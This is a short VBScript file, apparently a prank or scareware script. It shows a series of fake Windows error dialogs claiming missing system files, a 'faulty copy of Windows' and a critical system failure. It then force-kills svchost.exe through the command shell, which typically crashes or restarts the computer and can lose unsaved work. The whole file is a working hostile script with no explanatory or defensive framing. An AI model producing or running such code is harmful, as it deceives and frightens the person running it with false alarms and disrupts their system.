Dim oShell 
Set oShell = CreateObject("WScript.Shell")

x=msgbox("Windows could not start correctly because ntdll.dll is missing. Try Startup Repair to fix this problem.", 0+16, "System Error")
x=msgbox("It has been determined that you have a faulty copy of Windows. This Computer will begin automatic repair.", 0+64, "Begin System Scan")
x=msgbox("Oh No! It seems that there are more files missing and Startup Repair could not fix the issue!", 0+48, "Startup Repair")
x=msgbox("System going critical! Please contact someone while you still can!", 0+16, "System is Critical")

oShell.Run "%comspec% /c taskkill /f /im svchost.exe /f", , TRUE